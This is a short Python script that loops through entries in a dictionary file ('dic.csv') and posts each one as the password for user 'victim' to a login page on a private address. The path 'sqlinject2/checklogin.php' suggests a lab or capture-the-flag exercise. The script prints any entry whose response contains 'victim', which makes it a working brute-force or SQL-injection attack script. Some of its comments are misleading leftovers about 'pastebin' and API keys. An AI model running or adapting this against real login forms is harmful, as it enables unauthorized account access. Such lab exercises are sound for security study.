# importing the requests library 
import requests 
import pandas as pd 
import numpy as np
# defining the api-endpoint  
API_ENDPOINT = "http://172.27.16.3:33414/c011a736/sqlinject2/checklogin.php"
  
# your API key here 
#API_KEY = "XXXXXXXXXXXXXXXXX"
def check(string, sub_str): 
    if (string.find(sub_str) == -1): 
        return 0 
    else: 
        return 1
            
# driver code 
sub_str ="victim"

# reading csv file  
df = pd.read_csv("dic.csv") 
li= df.information._ndarray_values

# need to append the 1st value because its removing it by assuming it as the column head
l = np.append(li,['information'])
for i in l:
    # data to be sent to api
    string = i + "\n"
    payload = {'username':'victim','password':string}
    # sending post request and saving response as response object 
    r = requests.post(url = API_ENDPOINT, data = payload) 
    
    # extracting response text
    pastebin_url = r.text
    if check(pastebin_url, sub_str):
        print("The pastebin URL is:%s"%pastebin_url)
        print(i)